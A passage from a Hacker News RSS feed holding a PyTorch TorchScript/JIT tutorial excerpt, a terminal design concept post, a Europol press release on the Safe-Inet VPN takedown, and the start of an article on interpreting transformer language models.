December 22, 2020 | https://lernapparat.de/jit-optimization-intro/ | <a href="https://web.archive.org/web/*/https://lernapparat.de/jit-optimization-intro/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div id="submain">
  <article>

  
  
  <p>Dec. 21, 2020</p>
  
  <section>
   <p><img src="https://lernapparat.de/static/artikel/jit-optimization-intro/title.svg"> <span><label for="fn::fusor">⊕</label><span><span><a href="https://commons.wikimedia.org/wiki/File:US3386883_-_fusor.png">fusor</a></span></span></span></p>
<p>Today we look at TorchScript, the language implemented by the PyTorch JIT ("Just in Time compiler"), PyTorch's solution for deployment and model optimization. 
We can use it to export models to work beyond Python, e.g. on mobile or embedded platforms, or just to escape the infamous Python Global Interpreter Lock during computation. This is possibly the more well-known application.<span><label for="fn:thank_you"></label><span><span>Luca Antiga and Christian Sarofeen shared many insightful comments and suggestions after the article first went live. Thak you! All errors are still mine.</span></span></span></p>
<p>But the JIT also lends itself to the implementation <em>holistic</em> optimizations that consider several operations at once. This is  as opposed to just writing a better implementation of any given PyTorch operation, although the JIT works for these, too, as we will see.</p>
<p>We will start with a high-level overview of how PyTorch and the JIT work to then dive into the how it enables compiling fused kernels to optimize models at run time.<span><label for="fn:chapter15"></label><span><span>If you want to take a look at exporting models, do check out Chapter 15 of our <a href="https://www.manning.com/books/deep-learning-with-pytorch">book</a>, from which I also took some diagrams below. There we introduce the JIT with a view towards running the model in C++ and on mobile. The book also as a comprehensive introduction from everything PyTorch to how to represent data and a detailed account of project to build an AI detecting cancerous lung nodules.</span></span></span></p>
<p>This tutorial has been prepared in the context of work I did for AMD. Thank you!</p>
<h2>The overall structure of PyTorch</h2>
<p>The first thing we want to do when considering how the JIT works is consider the structure of PyTorch.</p>
<p><img src="https://lernapparat.de/static/artikel/jit-optimization-intro/Ch15_F4_PyTorch_calling_pytorch.svg">
(image from Deep Learning with PyTorch)</p>
<p>PyTorch most prominently is a Python library, I call this part classic PyTorch. Some parts are implemented in Python (e.g. the <code>torch.nn</code> modules and the optimizers), but the compute functions (like <code>torch.matmul</code>) are provided as a Python C++ extension.</p>
<p>Looking a bit closer, this Python C++ extension is a thin wrapper around PyTorch's C++ library <em>LibTorch</em>. That in turn uses the ATen tensor library which itself dispatches into various backends.</p>
<p>The PyTorch JIT now implements a virtual machine that takes in TorchScript programs (typically created through the <code>torch.jit</code> ) and runs them by calling into LibTorch itself, circumventing the Python parts.</p>
<p>The JIT also is extendable by defining <em>Custom Ops</em>, we'll get back to this. To run PyTorch-exported programs in Torch Mobile or Torch Serving, the typical thing is to implement a wrapper around the JIT api to load and run modules.</p>
<h2>TorchScript</h2>
<p>Now that we know that we want to run our model in the JIT execution, we should see how to get our model into TorchScript<span><label for="fn:torchscript"></label><span><span>TorchScript is used simultaneously for the language - mostly a typed subset of Python - and the representation (intermediate - IR).</span></span></span>, the form the JIT can process.</p>
<p>There are two main ways of achieving this (but they can be mixed), <em>scripting</em> and <em>tracing</em>. Let's look at them.</p>
<h3>Scripting</h3>
<p>Scripting compiles (mostly) a subset of Python.
It takes the Python source code and transforms it. 
"Here is what the function should do", just like normal programming.<span><label for="fn:notebook"></label><span><span>To run the code, check out the <a href="https://nbviewer.jupyter.org/github/lernapparat/tutorials/blob/main/jit/pytorch-jit-fuser-intro.ipynb">Notebook of this tutorial</a>.</span></span></span></p>
<div><pre><span></span><span>@torch.jit.script</span>
<span>def</span> <span>fn</span><span>(</span><span>x</span><span>):</span>
    <span>return</span> <span>x</span> <span>*</span> <span>2</span>
</pre></div>



<div><pre><span></span>(&lt;torch.jit.ScriptFunction at 0x7fcd5709a310&gt;,
 graph(%x.1 : Tensor):
   %2 : int = prim::Constant[value=2]() # &lt;ipython-input-3-6dcc6c3c1c8e&gt;:3:15
   %3 : Tensor = aten::mul(%x.1, %2) # &lt;ipython-input-3-6dcc6c3c1c8e&gt;:3:11
   return (%3))
</pre></div>

<h3>Tracing</h3>
<p>Tracing runs the code and observers the calls into PyTorch with some sample input.
"Watch me, now you know how to do the same."<span><label for="fn:evaluation_vs_print"></label><span><span>The avid reader will note that I sometimes leave the evaluation last (and have the result displayed by Jupyter if we are in a notebook) and sometimes use <code>print</code>. The main difference is how strings like <code>.code</code> below are handled: Jupyter will use "the representation" as output, showing multiline strings with newline characters as `\n, while printing actually starts a new line when seeing newline characters.</span></span></span></p>
<div><pre><span></span><span>def</span> <span>fn</span><span>(</span><span>x</span><span>):</span>
    <span>return</span> <span>x</span> <span>*</span> <span>2</span>
<span>fn</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>trace</span><span>(</span><span>fn</span><span>,</span> <span>[</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>5</span><span>)])</span>

<span>print</span><span>(</span><span>fn</span><span>.</span><span>graph</span><span>,</span> <span>fn</span><span>.</span><span>code</span><span>)</span>
</pre></div>

<div><pre><span></span>graph(%x : Float(5, strides=[1], requires_grad=0, device=cpu)):
  %1 : Long(requires_grad=0, device=cpu) = prim::Constant[value={2}]() # &lt;ipython-input-5-7d43d0af2e80&gt;:2:0
  %2 : Float(5, strides=[1], requires_grad=0, device=cpu) = aten::mul(%x, %1) # &lt;ipython-input-5-7d43d0af2e80&gt;:2:0
  return (%2)
 def fn(x: Tensor) -&gt; Tensor:
  return torch.mul(x, CONSTANTS.c0)
</pre></div>

<p>By the way: The specialization for the Tensor shape isn't relevant here and will be erased e.g. during saving of the model.</p>
<h3>What is TorchScript?</h3>
<p>Now that had a glimpse of TorchScript, what is it?</p>
<p>One important difference between TorchScript and Python is that in TorchScript everything is typed. Important
types are</p>
<ul>
<li><code>bool</code>, <code>int</code>, <code>long</code>, <code>double</code> for numbers (int = 32 bit integer, long = 64 bit integer)</li>
<li><code>Tensor</code> for tensors (of arbitrary shape, dtype, ...)</li>
<li><code>List[T]</code> a list with elements fo type T (one of the above)</li>
<li>Tuples are of fixed size with arbitrary but fixed element type, so e.g. <code>Tuple(Tensor, int)</code>.</li>
<li><code>Optional[T]</code> for things that can be <code>None</code></li>
</ul>
<p><code>None</code> always is of type <code>Optional[T]</code> for some specific <code>T</code> (except in the rarest circumstances).</p>
<p>PyTorch will mostly infer the intermediate and return types, but you need to annotate any non-Tensor inputs.</p>
<p>Another important difference is the binding behaviour - when a given variable name is looked up to find the associated variable. Python uses late binding. If we write a function that calls <code>torch.matmul</code> the Python interpreter will look up what <code>torch.matmul</code> is when it executes the statement in which it is used.</p>
<p>This is in contrast to many other languages, which use early binding, as - you guessed it - TorchScript does: When we compile a function to TorchScript, the JIT looks it up then<span><label for="fn:operator_dynamics"></label><span><span>While functions are looked up at compile time, the PyTorch JIT virtual machine executing the byte code looks up the <em>operators</em> during runtime.</span></span></span> and there and puts it into our function (it even inlines the commands, but that is not the point here).</p>
<h3>Tracing vs. Scripting</h3>
<p>Scripting will process all of the code, but it may not understand all of it. This means it captures all constructs it supports (e.g. some control flow), but it will fail if there is something it doesn't understand.</p>
<p>Tracing cannot see anything that is not a direct call into PyTorch and will happily ignore it (e.g. control flow)
This is also the reason why it will loudly complain if you have non-tensor inputs.</p>
<div><pre><span></span><span>def</span> <span>fn</span><span>(</span><span>x</span><span>):</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>x</span><span>.</span><span>dim</span><span>()):</span>
        <span>x</span> <span>=</span> <span>x</span> <span>*</span> <span>x</span>
    <span>return</span> <span>x</span>

<span>script_fn</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>script</span><span>(</span><span>fn</span><span>)</span>
<span>trace_fn</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>trace</span><span>(</span><span>fn</span><span>,</span> <span>[</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>5</span><span>,</span> <span>5</span><span>)])</span>
</pre></div>



<div><pre><span></span>def fn(x: Tensor) -&gt; Tensor:
  x0 = x
  for i in range(torch.dim(x)):
    x0 = torch.mul(x0, x0)
  return x0
</pre></div>



<div><pre><span></span>def fn(x: Tensor) -&gt; Tensor:
  x0 = torch.mul(x, x)
  return torch.mul(x0, x0)
</pre></div>

<h2>Tracing and Scripting Modules</h2>
<p>But our models often are not functions. What now?</p>
<p>With tracing, we can work with Modules just like we work with functions. We get a <code>ScriptModule</code> subclass that behaves much like a <code>Module</code> with parameters, state dict etc.</p>
<div><pre><span></span><span>model</span> <span>=</span> <span>torch</span><span>.</span><span>nn</span><span>.</span><span>Sequential</span><span>(</span>
    <span>torch</span><span>.</span><span>nn</span><span>.</span><span>Linear</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>),</span>
    <span>torch</span><span>.</span><span>nn</span><span>.</span><span>ReLU</span><span>(),</span>
    <span>torch</span><span>.</span><span>nn</span><span>.</span><span>Linear</span><span>(</span><span>10</span><span>,</span> <span>1</span><span>))</span>

<span>traced_model</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>trace</span><span>(</span><span>model</span><span>,</span> <span>[</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>8</span><span>,</span> <span>1</span><span>)])</span>
<span>type</span><span>(</span><span>traced_model</span><span>),</span> <span>traced_model</span>
</pre></div>

<div><pre><span></span>(torch.jit._trace.TopLevelTracedModule,
 Sequential(
   original_name=Sequential
   (0): Linear(original_name=Linear)
   (1): ReLU(original_name=ReLU)
   (2): Linear(original_name=Linear)
 ))
</pre></div>

<p>Saving is a bit different, here we include the model on purpose:</p>
<div><pre><span></span><span>traced_model</span><span>.</span><span>save</span><span>(</span><span>'./traced_model.pt'</span><span>)</span>
<span>loaded_model</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>load</span><span>(</span><span>'./traced_model.pt'</span><span>)</span>

<span>loaded_model</span><span>(</span><span>torch</span><span>.</span><span>randn</span><span>(</span><span>8</span><span>,</span><span>1</span><span>))</span>
</pre></div>

<div><pre><span></span>tensor([[ 0.2657],
        [ 0.1038],
        [ 0.1530],
        [ 0.3578],
        [ 0.0223],
        [ 0.0336],
        [-0.0023],
        [ 0.1440]], grad_fn=&lt;AddBackward0&gt;)
</pre></div>

<h2>Scripting Modules</h2>
<p>Scripting modules is ... a bit more tricky. The class in its entirety is not scripted, instead we need to script an instance of the module<span><label for="fn:no_init"></label><span><span>In particular we do not want to script the <code>__init__</code> method, but instead inspect the instance after it has been initialized.</span></span></span> . Then all data members will be collected and methods will be processed in a way similar to how script functions work.</p>
<div><pre><span></span><span>scripted_model</span> <span>=</span> <span>torch</span><span>.</span><span>jit</span><span>.</span><span>script</span><span>(</span><span>model</span><span>)</span>
<span>print</span><span>(</span><span>scripted_model</span><span>.</span><span>code</span><span>)</span>
</pre></div>

<div><pre><span></span>def forward(self,
    input: Tensor) -&gt; Tensor:
  _0 = getattr(self, "0")
  _1 = getattr(self, "1")
  _2 = getattr(self, "2")
  input0 = (_0).forward(input, )
  input1 = (_1).forward(input0, )
  return (_2).forward(input1, )
</pre></div>

<p>We can also look at the graph including submodules, but it gets unwieldy rather fast:</p>
<div><pre><span></span><span>scripted_model</span><span>.</span><span>forward</span><span>.</span><span>inlined_graph</span>
</pre></div>

<div><pre><span></span><span>graph</span><span>(</span><span>%self</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>container</span><span>.</span><span>___torch_mangle_13</span><span>.</span><span>Sequential</span><span>,</span>
      <span>%input</span><span>.1</span> <span>:</span> <span>Tensor</span><span>)</span><span>:</span>
  <span>%</span><span>2</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>linear</span><span>.</span><span>___torch_mangle_10</span><span>.</span><span>Linear</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"0"</span><span>](</span><span>%self</span><span>)</span>
  <span>%</span><span>3</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>activation</span><span>.</span><span>___torch_mangle_11</span><span>.</span><span>ReLU</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"1"</span><span>](</span><span>%self</span><span>)</span>
  <span>%</span><span>4</span> <span>:</span> <span>__torch__</span><span>.</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>modules</span><span>.</span><span>linear</span><span>.</span><span>___torch_mangle_12</span><span>.</span><span>Linear</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"2"</span><span>](</span><span>%self</span><span>)</span>
  <span>%</span><span>8</span> <span>:</span> <span>int</span> <span>=</span> <span>prim</span><span>::</span><span>Constant</span><span>[</span><span>value</span><span>=</span><span>1</span><span>]()</span>
  <span>%</span><span>9</span> <span>:</span> <span>int</span> <span>=</span> <span>prim</span><span>::</span><span>Constant</span><span>[</span><span>value</span><span>=</span><span>2</span><span>]()</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>22</span>
  <span>%</span><span>10</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"weight"</span><span>](</span><span>%</span><span>2</span><span>)</span>
  <span>%</span><span>11</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>prim</span><span>::</span><span>GetAttr</span><span>[</span><span>name</span><span>=</span><span>"bias"</span><span>](</span><span>%</span><span>2</span><span>)</span>
  <span>%</span><span>12</span> <span>:</span> <span>int</span> <span>=</span> <span>aten</span><span>::</span><span>dim</span><span>(</span><span>%input</span><span>.1</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>7</span>
  <span>%</span><span>13</span> <span>:</span> <span>bool</span> <span>=</span> <span>aten</span><span>::</span><span>eq</span><span>(</span><span>%</span><span>12</span><span>,</span> <span>%</span><span>9</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>7</span>
  <span>%input</span><span>.3</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>prim</span><span>::</span><span>If</span><span>(</span><span>%</span><span>13</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1663</span><span>:</span><span>4</span>
    <span>block0</span><span>()</span><span>:</span>
      <span>%</span><span>15</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>aten</span><span>::</span><span>t</span><span>(</span><span>%</span><span>10</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1665</span><span>:</span><span>39</span>
      <span>%ret</span><span>.2</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>aten</span><span>::</span><span>addmm</span><span>(</span><span>%</span><span>11</span><span>,</span> <span>%input</span><span>.1</span><span>,</span> <span>%</span><span>15</span><span>,</span> <span>%</span><span>8</span><span>,</span> <span>%</span><span>8</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span><span>/</span><span>lib</span><span>/</span><span>python3</span><span>.9</span><span>/</span><span>dist</span><span>-</span><span>packages</span><span>/</span><span>torch</span><span>/</span><span>nn</span><span>/</span><span>functional</span><span>.</span><span>py</span><span>:</span><span>1665</span><span>:</span><span>14</span>
      <span>-&gt;</span> <span>(</span><span>%ret</span><span>.2</span><span>)</span>
    <span>block1</span><span>()</span><span>:</span>
      <span>%</span><span>17</span> <span>:</span> <span>Tensor</span> <span>=</span> <span>aten</span><span>::</span><span>t</span><span>(</span><span>%</span><span>10</span><span>)</span> <span>#</span> <span>/</span><span>usr</span><span>/</span><span>local</span>…</pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lernapparat.de/jit-optimization-intro/">https://lernapparat.de/jit-optimization-intro/</a></em></p>]]>
            </description>
            <link>https://lernapparat.de/jit-optimization-intro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508269</guid>
            <pubDate>Tue, 22 Dec 2020 16:51:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing a Better Terminal]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25508230">thread link</a>) | @markessien
<br/>
December 22, 2020 | https://markessien.com/posts/terminal-concept/ | <a href="https://web.archive.org/web/*/https://markessien.com/posts/terminal-concept/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img src="https://markessien.com/img/posts/superterm.jpg" alt="SuperTerm"></p><p>Click <a href="https://markessien.com/img/posts/superterm.jpg">here</a> to view the bigger version.</p><p>I’ve been doing a lot of DevOps work recently, and terminals are horridly broken. There is so much copy and paste going on (well, unless you have a super memory). Why can’t we fix that?</p><p>I have designed an improved terminal for people who deal with a lot of different servers, and need to do a bunch of different things.</p><p>On the left side, you can add all the servers you usually ssh into. You see their name and IP address prominently displayed. The green screen shows if you are currently logged in or not. When a task you were executing has stopped, a tiny cursor starts blinking.</p><p><img src="https://markessien.com/img/posts/superterm1.jpg" alt="SuperTerm"></p><p>I admit it, I still search the web anytime I need to setup MySQL. I still search the web for almost any DevOps task. And you end up with inconsistent blog posts riddled with ads. What if all that could move straight to the terminal - you search, and you get a guide. You can then click on the commands and they instantly copy into your terminal cursor.</p><p><img src="https://markessien.com/img/posts/superterm4.jpg" alt="SuperTerm"></p><p>Running 6 servers like I do, I probably have about 20 passwords per server. That’s 120 passwords I need to regularly reference - and they are all in my password manager, which sits somewhere very far away (by click-count). What if all the passwords were right there in the terminal - so when I need MySQL root password, I can just access it.</p><p><img src="https://markessien.com/img/posts/superterm2.jpg" alt="SuperTerm"></p><p>If you are installing something complex, you often need to reference history. Either to copy some command or to check if you did things right. History is long, and scrolls your screen. It’s inconvenient to use. What if you could simply show it in the sidebar anytime you wanted? That would spead up my work immensely.</p><p><img src="https://markessien.com/img/posts/superterm3.jpg" alt="SuperTerm"></p><p>(Btw, there is a grid view also, in case you need to view up to 4 terminals from different servers at once.) But generally, I feel the above would make terminal work far more convenient for people who work with a lot of servers.</p></section></div>]]>
            </description>
            <link>https://markessien.com/posts/terminal-concept/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508230</guid>
            <pubDate>Tue, 22 Dec 2020 16:48:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VPN Safe-Inet has been taken down by Europol]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25508164">thread link</a>) | @giuliomagnifico
<br/>
December 22, 2020 | https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action | <a href="https://web.archive.org/web/*/https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Law enforcement wiretapped the very service used by criminals to evade interception</p><div><p>The virtual private network (VPN) Safe-Inet used by the world’s foremost cybercriminals has been taken down yesterday in a coordinated law enforcement action led by the German Reutlingen Police Headquarters together with Europol and law enforcement agencies from around the world.&nbsp;</p>
<p>The Safe-Inet service was shut down and its infrastructure seized in Germany, the Netherlands, Switzerland, France and the United States. The servers were taken down, and a splash page prepared by Europol was put up online after the domain seizures. This coordinated takedown was carried out in the framework of the <a href="https://www.europol.europa.eu/empact">European Multidisciplinary Platform Against Criminal Threats (EMPACT)</a>.&nbsp;</p>
<h3>Turning the table on the criminals&nbsp;</h3>
<p>Active for over a decade, Safe-Inet was being used by some of the world’s biggest cybercriminals, such as the ransomware operators responsible for ransomware, E-skimming breaches and other forms of serious cybercrime.&nbsp;</p>
<p>This VPN service was sold at a high price to the criminal underworld as one of the best tools available to avoid law enforcement interception, offering up to 5 layers of anonymous VPN connections.</p>
<p>Law enforcement were able to identify some 250 companies worldwide which were being spied on by the criminals using this VPN. These companies were subsequently warned of an imminent ransomware attack against their systems, allowing them to take measures to protect themselves against such an attack.<br>
The service has now been rendered inaccessible.&nbsp;</p>
<p>Investigations are ongoing in a number of countries to identify and take action against some of Safe-Inet’s users. &nbsp;</p>
<h3>International cyber sweep&nbsp;</h3>
<p>International police cooperation was central to the success of this investigation as the critical infrastructure was scattered across the world.</p>
<p>Europol’s <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3) </a>supported the investigation from the onset, bringing together all the involved countries to establish a joint strategy and to organise the intensive exchange of information and evidence needed to prepare for the final phase of the takedown.&nbsp;</p>
<p>The <strong>Police President of the Reutlingen Police Headquarters, Udo Vogel</strong>, said:</p>
<blockquote><p>The investigation carried out by our cybercrime specialists has resulted in such a success thanks to the excellent international cooperation with partners worldwide. The results show that law enforcement authorities are equally as well connected as criminals.&nbsp;</p>
</blockquote>
<p>The <strong>Head of Europol’s European Cybercrime Centre, Edvardas Šileris</strong>, said:</p>
<blockquote><p>The &nbsp;strong working relationship fostered by Europol between the investigators involved in this case on either side of the world was central in bringing down this service. &nbsp;Criminals can run but they cannot hide from law enforcement, and we will continue working tirelessly together with our partners to outsmart them.</p>
</blockquote>
<h3>Participating agencies</h3>
<ul><li><strong>Germany:</strong> Reutlingen Police Headquarters (Polizeipräsidium Reutlingen)</li>
<li><strong>The Netherlands: </strong>National Police (Politie)</li>
<li><strong>Switzerland:</strong> Cantonal Police of Argovia (Kantonspolizei Aargau)&nbsp;</li>
<li><strong>United States: </strong>&nbsp;Federal Bureau of Investigation</li>
<li><strong>France: </strong>Judicial Police (Direction Centrale de la Police Judiciaire)</li>
<li><strong>Europol:</strong> European Cybercrime Centre (EC3)&nbsp;</li>
</ul></div></div>]]>
            </description>
            <link>https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action</link>
            <guid isPermaLink="false">hacker-news-small-sites-25508164</guid>
            <pubDate>Tue, 22 Dec 2020 16:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interfaces for Explaining Transformer Language Models]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25508118">thread link</a>) | @Brajeshwar
<br/>
December 22, 2020 | https://jalammar.github.io/explaining-transformers/ | <a href="https://web.archive.org/web/*/https://jalammar.github.io/explaining-transformers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        











<p>Interfaces for exploring transformer language models by looking at input saliency and neuron activation.</p>

<div>

<div>
<figure>
    <figcaption>
        <strong>Explorable #1:</strong>  Input saliency of a list of countries generated by a language model<br>
         <strong>Tap or hover over</strong> the <strong>output tokens</strong>:</figcaption>
    
    <br>
    <figcaption>
    <br>
        <strong>Explorable #2:</strong>  Neuron activation analysis reveals four groups of neurons, each is associated with generating a certain type of token<br>
        <strong>Tap or hover over</strong> the sparklines on the left to isolate a certain factor:</figcaption>
    
    <br>
</figure>
    </div>
</div>

<!--
<div class="toc">
    <h3>Contents</h3>
    <ul>
        <li>
            <a href="#introduction">Introduction</a>
        </li>
        <li>
            <a href="#saliency">Input Saliency</a>
        </li>
        <li>
            <a href="#evolution">Evolution of Hidden States</a>
        </li>
        <li>
            <a href="#activations">Neuron Activations</a>
        </li>
        <li>
            <a href="#conclusion">Conclusion & Future Work</a>
        </li>
    </ul>
</div>
-->

<p id="introduction">The Transformer architecture<cite key="vaswani2017attention"></cite>
    has been powering a number of the recent advances in NLP. A breakdown of this architecture is provided <a href="https://jalammar.github.io/illustrated-transformer/">here</a> <cite key="alammar2018illustrated"></cite>. Pre-trained language models based on the architecture,
    in both its auto-regressive<cite key="liu2018generating,radford2018improving,radford2019language,brown2020language"></cite> (models that use their own output as input to next time-steps and that process tokens from left-to-right, like GPT2)
    and denoising<cite key="devlin2018bert,liu2019roberta,lan2019albert,lewis2019bart,raffel2019exploring"></cite> (models trained by corrupting/masking the input and that process tokens bidirectionally, like BERT)
    variants continue to push the envelope in various tasks in NLP and, more recently, in computer vision<cite key="dosovitskiy2020image"></cite>. Our understanding of why these models work so well, however, still lags behind these developments.
</p>

<p>This exposition series continues the pursuit to interpret<cite key="rogers2020primer,atanasova2020diagnostic"></cite>
    and visualize<cite key="vig2019visualizing,madsen2019visualizing,hoover2020,tenney2020language,wallace2019allennlp"></cite>
    the inner-workings of transformer-based language models.

We illustrate how some key interpretability methods apply to transformer-based language models. This article focuses on auto-regressive models, but these methods are applicable to other architectures and tasks as well.
     
</p>

<p>This is the first article in the series. In it, we present explorables and visualizations aiding the intuition of:</p>
<ul>
    <li>
        <strong>Input Saliency</strong> methods that score input tokens importance to generating a token.
    </li>
    <li>
        <strong>Neuron Activations</strong> and how individual and groups of model neurons spike in response to
        inputs and to produce outputs.
    </li>
</ul>

<p>The next article addresses <strong>Hidden State Evolution</strong> across the layers of the model and what it may tell us about each layer's role.</p>

<!--more-->

<!--
    <li>
        <strong>Attention</strong>, a central concept in transformers, and how recent work<cite key="abnar2020quantifying"></cite>
        leads to visualizations that are more faithful to its role.
    </li>
-->

<p>In the language of Interpretable Machine Learning (IML) literature like Molnar et al.<cite key="molnar2020interpretable"></cite>, input saliency is a method that explains individual predictions. The latter two methods fall under the
    umbrella of "analyzing components of more complex models", and are better described as increasing the transparency<cite key="du2019techniques,carvalho2019machine"> </cite> of transformer models.
</p>

<p>Moreover, this article is accompanied by <a href="https://github.com/jalammar/ecco/tree/main/notebooks">reproducible notebooks</a> and <a href="https://github.com/jalammar/ecco/">Ecco - an open source library</a> to create similar
    interactive interfaces directly in Jupyter notebooks<cite key="ragan2014jupyter"></cite>
    for GPT-based<cite key="radford2018improving"></cite> models from the HuggingFace transformers library<cite key="wolf2019huggingface"></cite>.
</p>

<p>If we're to impose the three components we're examining to explore the architecture of the transformer, it would look like the following figure.</p>
<figure>
    <img src="https://jalammar.github.io/images/explaining/transformer-input-saliency-hidden-states-neuron-activations.png">
    <figcaption>
        <strong>
            Figure: Three methods to gain a little more insight into the inner-workings of Transformer language models.
        </strong> <br>
        By introducing tools that visualize input saliency, the evolution of hidden states, and neuron activations, we aim to enable researchers to build more intuition about Transformer language models.
    </figcaption>
</figure>

<hr>

<h2 id="saliency">Input Saliency</h2>

<p>When a computer vision model classifies a picture as containing a husky, saliency maps can tell us whether the classification was made due to the visual properties of the animal itself, or because of the snow in the background<cite key="ribeiro2016whyribeiro2016why"></cite>. This is a method of <i>attribution</i> explaining the relationship between a model's output and inputs -- helping us detect errors and biases, and better understand the behavior of the system.</p>

<figure>
    <img src="https://jalammar.github.io/images/explaining/dog-saliency-map.jpg">
    <figcaption>
        <strong>
            Figure: Input saliency map attributing a model's prediction to input pixels.
        </strong> <br>
    </figcaption>
</figure>

<p>Multiple methods exist for assigning importance scores to the inputs of an NLP model<cite key="li2015visualizing,arrieta2020explainable"></cite>. The literature is most often concerned with this application for classification tasks, rather than natural
    language generation. This article focuses on language generation. Our first interface calculates feature importance after each token is generated, and by
    hovering or tapping on an output token, imposes a saliency map on the tokens responsible for generating it.
</p>

<p>
    The first example for this interface asks GPT2-XL<cite key="radford2019language"></cite> for William Shakespeare's date of birth. The model is correctly able to produce the date (1564, but broken into two tokens: " 15" and "64", because the model's vocabulary does not include " 1564" as a single token). The interface shows the importance of each input token when generating each output token:
</p>
<figure>

    
    
    <figcaption>
        <strong>Explorable: Input saliency of Shakespeare's birth
            year using Gradient × Input.</strong>
        <strong>Tap or hover over</strong> the output tokens.<br>
        GPT2-XL is able to tell the birth date of William Shakespeare expressed in two tokens. In generating the
        first token, 53% of the importance is assigned to the name (20% to the first name, 33% to the last name).
        The next most important two tokens are " year" (22%) and " born" (14%). In generating the second token to
        complete the date, the name still is the most important with 60% importance, followed by the first portion
        of the date -- a model output, but an input to the second time step. <br>
        This prompt aims to probe world knowledge. It was generated using greedy decoding. Smaller variants of GPT2
        were not able to output the correct date.
    </figcaption>
</figure>

<p>Our second example attempts to both probe a model's world knowledge, as well as to see if the model
    repeats the patterns in the text (simple patterns like the periods after numbers and like new lines, and
    slightly more involved patterns like completing a numbered list). The model used here is DistilGPT2<cite key="sanh2020distilbert"></cite>.
</p>

<p>This explorable shows a more detailed view that displays the attribution percentage for each token -- in case you need that precision.</p>

<figure>
   
    
    <br>
    <figcaption>
        <strong>Explorable: Input saliency of a list of EU countries</strong> <br>
        <strong>Tap or hover over</strong> the output tokens.<br>
